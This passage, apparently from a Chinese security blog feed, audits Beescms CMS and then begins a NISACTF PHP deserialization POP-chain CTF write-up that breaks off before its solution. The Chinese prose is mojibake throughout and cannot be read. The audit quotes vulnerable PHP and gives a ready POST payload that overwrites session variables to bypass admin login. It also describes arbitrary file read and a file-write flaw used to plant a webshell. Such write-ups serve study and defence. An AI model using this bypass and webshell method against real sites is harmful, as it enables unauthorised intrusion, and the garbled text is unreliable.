title="å››ã€ä»»æ„PHPæ–‡ä»¶åŒ…å«æ¼æ´"></a>å››ã€ä»»æ„PHPæ–‡ä»¶åŒ…å«æ¼æ´</h1><p>æ¼æ´ç‚¹ï¼š<code>admin/admin_channel.php</code></p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022223611872.png" alt="image-20241022223611872"></p><p>ç”±äºæ ¡éªŒä¸ä¸¥æ ¼å¯¼è‡´å¯ä»¥åˆ©ç”¨..&#x2F;åŒ…å«ä»»æ„phpæ–‡ä»¶</p><p>è¿™ä¸ªæ¼æ´ç¨æœ‰ç‚¹é¸¡è‚‹ï¼Œä½ éƒ½ç™»é™†åå°äº†ï¼Œè¿˜å·®åŒ…å«ä»–è¿™ä¸ªphpå—</p><h1 id="äº”ã€æ°´å¹³è¶Šæƒæ¼æ´"><a href="#äº”ã€æ°´å¹³è¶Šæƒæ¼æ´" class="headerlink" title="äº”ã€æ°´å¹³è¶Šæƒæ¼æ´"></a>äº”ã€æ°´å¹³è¶Šæƒæ¼æ´</h1><p>åœ¨è®¿é—®<code>admin/admin.php</code>çš„ä»£ç ä¸­åŒ…å«äº†<code>init.php</code>æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸­å®ç°äº†åˆ¤æ–­æ˜¯å¦æ˜¯ç®¡ç†å‘˜çš„ç™»é™†çŠ¶æ€ï¼Œå¦‚ä¸‹å…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç™»é™†</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_login</span>())&#123;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:login.php&#x27;</span>);<span class="keyword">exit</span>;&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå®ç°æ£€æŸ¥çš„ä»£ç åœ¨<code>is_login()</code>å‡½æ•°ä¸­ï¼ŒæŸ¥çœ‹é€»è¾‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login_in&#x27;</span>] == <span class="number">1</span> &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123; <span class="comment">// åˆ¤æ–­sessionä¸­login_in æ˜¯å¦ä¸º1ä»¥åŠadminæ˜¯å¦æœ‰å€¼</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() - <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] &gt; <span class="number">3600</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">login_out</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line">            @<span class="title function_ invoke__">session_regenerate_id</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_purview&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_time&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_in&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_ip&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç æœ¬èº«çš„é€»è¾‘æ˜¯ä¸å­˜åœ¨é—®é¢˜çš„ï¼Œé—®é¢˜å‡ºåœ¨å…¶ä»–çš„å¾ˆå¤šåœ°æ–¹å¼•ç”¨äº†è¿™ä¸ªé€»è¾‘ï¼Œæ¯”å¦‚æœ‰è¿™æ ·ä¸€ä¸ªæ–‡ä»¶ï¼Œ<code>includes/init.php</code>ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>))&#123;<span class="variable">$_REQUEST</span>  = <span class="title function_ invoke__">fl_value</span>(<span class="variable">$_REQUEST</span>);&#125;</span><br><span class="line">    <span class="variable">$_COOKIE</span>   = <span class="title function_ invoke__">fl_value</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="variable">$_GET</span> = <span class="title function_ invoke__">fl_value</span>(<span class="variable">$_GET</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_COOKIE</span>);</span><br></pre></td></tr></table></figure><p>é™„ä¸Šextract() å‡½æ•°ç®€å•ç®€ä»‹</p><blockquote><p><em>PHP extract() å‡½æ•°æ˜¯ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­è¿›è¡Œå˜é‡è¦†ç›–</em></p></blockquote><p>å¦‚æœæˆ‘ä»¬åˆ©ç”¨extract() å‡½æ•°è¦†ç›–session çš„å†…å®¹å¦‚ä½•å‘¢ï¼Ÿæ¯•ç«Ÿåœ¨ä»£ç çš„ä¸Šæ–¹å¼€å¯äº†sessionã€‚</p><p>fl_value() å‡½æ•°çš„å†…å®¹æˆ‘ä»¬åœ¨SQLæ³¨å…¥é‚£é‡Œåˆ†æè¿‡ï¼Œä¼šè¿›è¡Œä¸€äº›è¿‡æ»¤ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°è¿™é‡Œçš„POSTæ˜¯æ²¡æœ‰è¿›è¡Œè¿‡æ»¤çš„ï¼Œæˆ‘ä»¬å°±åˆ©ç”¨POSTæ¥è¿›è¡Œsessionå˜é‡è¦†ç›–</p><p>åœ¨æˆ‘ä»¬çš„é¦–é¡µ<code>index.php</code>ä¸­å°±å‘ç°å¼•ç”¨äº†è¿™ä¸ª<code>includes/init.php</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMS&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/init.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/fun.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/lib.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œè®¿é—®é¦–é¡µç›´æ¥ä¼ é€’POSTå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[login_in]=<span class="number">1</span>&amp;_SESSION[admin]=<span class="number">1</span>&amp;_SESSION[login_time]=<span class="number">1729688888</span></span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022230933955.png" alt="image-20241022230933955"></p><h1 id="å…­ã€ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"><a href="#å…­ã€ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="å…­ã€ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"></a>å…­ã€ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</h1><p>åœ¨<code>admin/admin_template.php</code>æ–‡ä»¶ä¸­å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ¨¡æ¿ä¿®æ”¹ç•Œé¢</span></span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$action</span>==<span class="string">&#x27;xg&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span>=CMS_PATH.<span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;r+&#x27;</span>))&#123;<span class="title function_ invoke__">err</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;æ¨¡æ¿æ‰“å¼€å¤±è´¥,è¯·ç¡®å®šã€&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;ã€‘æ¨¡æ¿æ˜¯å¦å­˜åœ¨&lt;/span&gt;&#x27;</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_EX);</span><br><span class="line"><span class="variable">$str</span>=@<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;&amp;amp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span>= <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;&amp;#39;&quot;</span>,<span class="string">&quot;&amp;quot;&quot;</span>,<span class="string">&quot;&amp;lt;&quot;</span>,<span class="string">&quot;&amp;gt;&quot;</span>),<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_UN);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§ï¼Œå¯¹ä¼ å…¥è¦è¯»å–çš„file æ–‡ä»¶å¹¶æ²¡æœ‰åšé™åˆ¶ï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶çš„è¯»å–</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022234433046.png" alt="image-20241022234433046"></p><h1 id="ä¸ƒã€ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"><a href="#ä¸ƒã€ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´" class="headerlink" title="ä¸ƒã€ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"></a>ä¸ƒã€ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</h1><p>åŒæ ·åœ¨<code>admin/admin_template.php</code>æ–‡ä»¶ä¸­å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¤„ç†æ¨¡æ¿ä¿®æ”¹</span></span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$action</span>==<span class="string">&#x27;save_template&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;template&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$path</span>=CMS_PATH.<span class="variable">$file</span>;</span><br><span class="line"><span class="comment">//åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>))&#123;<span class="title function_ invoke__">msg</span>(<span class="string">&#x27;ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯·é‡æ–°æ“ä½œ&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;w+&#x27;</span>))&#123;<span class="title function_ invoke__">err</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;æ¨¡æ¿æ‰“å¼€å¤±è´¥,è¯·ç¡®å®šã€&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;ã€‘æ¨¡æ¿æ˜¯å¦å­˜åœ¨&lt;/span&gt;&#x27;</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_EX);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$template</span>);</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_UN);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ª<code>stripslashes</code>å‡½æ•°å¯¹æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™ä¸ªå‡½æ•°åªæ˜¯å»é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ \ï¼Œä¸å½±å“æˆ‘ä»¬å†™å…¥webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;1&#x27;2\&quot;3&lt;4&gt;5? 6&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;  <span class="comment">// è¾“å‡ºï¼š1&#x27;2&quot;3&lt;4&gt;5? 6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥beescmsæ ¹ç›®å½•ä¸‹çš„phpinfo.php æ–‡ä»¶ä¸ºä¾‹å†™å…¥webshell</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022235331691.png" alt="image-20241022235331691"></p><p>æˆåŠŸå†™å…¥</p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€CTFç«èµ›ã€‘[NISACTF 2022]popchainsâ€”PHPååºåˆ—åŒ–POPé“¾</title>
      <link href="/2024/07/23/CTF-competition-PHPserialize-pop/"/>
      <url>/2024/07/23/CTF-competition-PHPserialize-pop/</url>
      
        <content type="html"><![CDATA[<h1 id="NISACTF-2022-popchainsâ€”PHPååºåˆ—åŒ–POPé“¾"><a href="#NISACTF-2022-popchainsâ€”PHPååºåˆ—åŒ–POPé“¾" class="headerlink" title="[NISACTF 2022]popchainsâ€”PHPååºåˆ—åŒ–POPé“¾"></a>[NISACTF 2022]popchainsâ€”PHPååºåˆ—åŒ–POPé“¾</h1><h2 id="ä¸€ã€çœ‹é¢˜"><a href="#ä¸€ã€çœ‹é¢˜" class="headerlink" title="ä¸€ã€çœ‹é¢˜"></a>ä¸€ã€çœ‹é¢˜</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€é“éå¸¸ç»å…¸çš„PHPååºåˆ—åŒ–çš„POPé“¾è°ƒç”¨çš„é¢˜ï¼Œéå¸¸æœ‰å‚è€ƒå­¦ä¹ ä»·å€¼</p><h2 id="äºŒã€æ¨ªæ‰«popé“¾ç›²åŒº"><a href="#äºŒã€æ¨ªæ‰«popé“¾ç›²åŒº" class="headerlink" title="äºŒã€æ¨ªæ‰«popé“¾ç›²åŒº"></a>äºŒã€æ¨ªæ‰«popé“¾ç›²åŒº</h2><h3 id="1ã€ååºåˆ—åŒ–ä¸­å¸¸è§èµ·ç‚¹å‡½æ•°"><a href="#1ã€ååºåˆ—åŒ–ä¸­å¸¸è§èµ·ç‚¹å‡½æ•°" class="headerlink" title="1ã€ååºåˆ—åŒ–ä¸­å¸¸è§èµ·ç‚¹å‡½æ•°"></a>1ã€ååºåˆ—åŒ–ä¸­å¸¸è§èµ·ç‚¹å‡½æ•°</h3><ol><li>__wakeup ä¸€å®šä¼šè°ƒç”¨ï¼šåœ¨ååºåˆ—åŒ–ä¹‹å‰è¢«è°ƒç”¨</li><li>__destruct ä¸€å®šä¼šè°ƒç”¨ï¼šå½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚åŠååºåˆ—åŒ–ä¹‹åçš„å¯¹è±¡æ‰§è¡Œçš„å†…å®¹èµ°å®Œä¹‹åï¼Œæ— è·¯å¯èµ°ï¼Œä»–å°±ä¼šèµ°</li><li>__toString å½“ä¸€ä¸ªå¯¹è±¡ååºåˆ—åŒ–åè¢«å½“åšå­—ç¬¦ä¸²è°ƒç”¨</li></ol><h3 id="2ã€ååºåˆ—åŒ–ä¸­å¸¸è§çš„ä¸­é—´è·³æ¿"><a href="#2ã€ååºåˆ—åŒ–ä¸­å¸¸è§çš„ä¸­é—´è·³æ¿" class="headerlink" title="2ã€ååºåˆ—åŒ–ä¸­å¸¸è§çš„ä¸­é—´è·³æ¿"></a>2ã€ååºåˆ—åŒ–ä¸­å¸¸è§çš„ä¸­é—´è·³æ¿</h3><ol><li>__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨</li><li>__get è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨</li><li>__set å½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨</li><li>__isset å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨</li><li>__invokeï¼šå½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ã€‚å½¢å¦‚ $this-&gt;$func();</li></ol><h3 id="3ã€ååºåˆ—åŒ–ä¸­å¸¸è§çš„ç»ˆç‚¹å‡½æ•°"><a href="#3ã€ååºåˆ—åŒ–ä¸­å¸¸è§çš„ç»ˆç‚¹å‡½æ•°" class="headerlink" title="3ã€ååºåˆ—åŒ–ä¸­å¸¸è§çš„ç»ˆç‚¹å‡½æ•°"></a>3ã€ååºåˆ—åŒ–ä¸­å¸¸è§çš„ç»ˆç‚¹å‡½æ•°</h3><ol><li>__call è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨</li><li>call_user_func ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ</li><li>call_user_func_array ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ</li></ol><h2 id="ä¸‰ã€è§£é¢˜"><a href="#ä¸‰ã€è§£é¢˜" class="headerlink" title="ä¸‰ã€è§£é¢˜"></a>ä¸‰ã€è§£é¢˜</h2><h3 id="1ã€é”å®šå…¥å£ç±»"><a href="#1ã€é”å®šå…¥å£ç±»" class="headerlink" title="1ã€é”å®šå…¥å£ç±»"></a>1ã€é”å®šå…¥å£ç±»</h3><p>å…ˆçœ‹éclass ç±»çš„éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è·å–ä¸€ä¸ªget å‚æ•°ï¼Œä¹‹åå¯¹å…¶å€¼è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œååºåˆ—åŒ–ä¸€ä¸ªå®ä¾‹å¯¹è±¡å‡ºæ¥ã€‚æ—¢ç„¶çŸ¥é“å¯¹å€¼è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ª<code>wish</code>çš„å€¼ä¸€å®šæ˜¯æŸä¸ªå¯¹è±¡åºåˆ—åŒ–åçš„å€¼ã€‚é€šè¯»ä¸‹æ–‡çŸ¥é“ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªclass ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç­”æ¡ˆå°±æ˜¯ä¸€ä¸‹ä¸‰ä¸ªå…¶ä¸­ä¸€ä¸ªclass å¯¹è±¡çš„åºåˆ—åŒ–å€¼ã€‚</p><p>é‚£å…·ä½“æ˜¯è°ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œæœ‰ä¸‰ä¸ªå…¥å£å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯<code>__wakeup</code>ã€<code>__destruct </code>å’Œ<code>__toString</code>å‡½æ•°ã€‚æˆ‘ä»¬é€æ­¥åˆ†æ</p><ol><li><code>__wakeup</code>å‡½æ•°ï¼šåœ¨ååºåˆ—åŒ–çš„å¯¹è±¡è¢«æ¿€æ´»ä¹‹å‰ï¼Œä¼šèµ°<code>__wakeup</code>å‡½æ•°ï¼Œåœ¨ä¸‰ä¸ªclass ç±»ä¸­ï¼Œåªæœ‰<code>Road_is_Long</code>ç±»æœ‰è¿™ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´<code>Road_is_Long</code>ç±»æ˜¯å¯ä»¥ä½œä¸ºå…¥å£ç±»</li><li>__destruct å‡½æ•°ï¼šä¸‰ä¸ªclass ç±»ä¸­æ²¡æœ‰è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸èƒ½ç”¨è¿™ä¸ªæ¥è¯„ä¼°å…¥å£ç±»</li><li>__toString å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°åœ¨è¢«ä½œä¸ºå…¥å£è¯„ä¼°å‡½æ•°ä¹‹å‰ï¼Œéœ€è¦åœ¨éclass ç±»çš„éƒ¨åˆ†ä¸­ï¼Œååºåˆ—åŒ–åè¢«å½“åšå­—ç¬¦ä¸²è°ƒç”¨æ‰èƒ½ä½œä¸ºå…¥å£è¯„ä¼°å‡½æ•°ã€‚æ¯”å¦‚ï¼š<code>echo @unserialize($\_GET[&#39;wish&#39;]);</code>ï¼Œæ‰€ä»¥åœ¨æœ¬é¢˜ä¸­ä¹Ÿä¸èƒ½è¢«ä½œä¸ºå…¥å£è¯„ä¼°å‡½æ•°</li></ol><p>è¿™æ ·ï¼Œæˆ‘ä»¬é”å®šäº†å…¥å£çš„class ç±» <code>Road_is_Long</code>ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦å†™ä»£ç 